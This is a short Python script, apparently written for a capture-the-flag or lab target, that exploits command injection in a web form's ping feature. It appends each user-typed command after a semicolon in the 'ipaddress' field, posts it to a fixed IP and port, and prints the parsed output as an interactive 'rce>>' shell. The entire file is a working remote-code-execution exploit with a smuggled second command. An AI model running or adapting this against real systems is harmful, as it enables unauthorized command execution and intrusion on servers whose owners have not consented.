#!/usr/bin/python3

from requests import post

eplots = input('rce>> ')
data = { 'test': 'ping', 'ipaddress': f'178.62.18.46; {eplots}', 'submit': 'Test' }
r = post('http://178.62.18.46:30815/', data=data)

res = r.text
res = res.split('packet loss\n')[-1]
res = res.split('</textarea>')[0]

print(res.strip())
